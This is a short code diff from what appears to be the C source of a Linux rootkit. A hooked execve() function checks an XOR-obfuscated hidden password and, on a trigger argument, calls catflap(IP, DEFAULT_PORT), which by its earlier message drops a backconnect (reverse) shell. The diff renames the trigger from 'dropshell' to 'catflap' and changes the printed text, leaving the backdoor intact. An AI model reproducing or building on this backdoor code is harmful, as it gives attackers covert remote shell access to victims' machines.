@@ -118,9 +118,9 @@ int execve(const char *path, char *const argv[], char *const envp[])
 			char *execpw = strdup(EXECPW); xor(execpw); 
 			if (!strcmp(argv[1],  execpw))
 			{	
-				if (!strcmp(argv[2], "dropshell"))
+				if (!strcmp(argv[2], "catflap"))
 				{ 
-					printf("dropping backconnect shell\n");
+					printf("opening catflap\n");
 				        catflap(IP, DEFAULT_PORT);
 				}
 			} 
